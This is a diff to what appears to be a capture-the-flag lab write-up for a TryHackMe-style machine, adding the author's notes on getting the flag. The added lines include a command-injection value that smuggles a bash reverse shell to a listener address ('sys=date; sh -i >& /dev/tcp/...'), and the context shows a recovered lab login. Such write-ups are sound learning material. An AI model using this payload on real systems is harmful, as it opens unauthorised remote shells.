@@ -172,6 +172,10 @@ it works!
 
 specialadmin@support.thm:support@110
 
-Now I just need to actually get into the machine and figure that out.
+After bashing my head into this and really thinking about it one of the solutions, which to be honest I had to look it up because It has to be more complex, turns out it is not.  now I know you can probably set up a listener, which I will try in a minute, but this helped me to get the flag.
 
-Reminder for me: Fix the Images.
+<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+sys=date; sh -i >& /dev/tcp/10.65.122.182/4444 0>&1
+
+&#x20;I also wanted to try to see if this reverse shell would work like it is supposed to, but my machine ended up expiring and I did not get to test it out, like I wanted to.
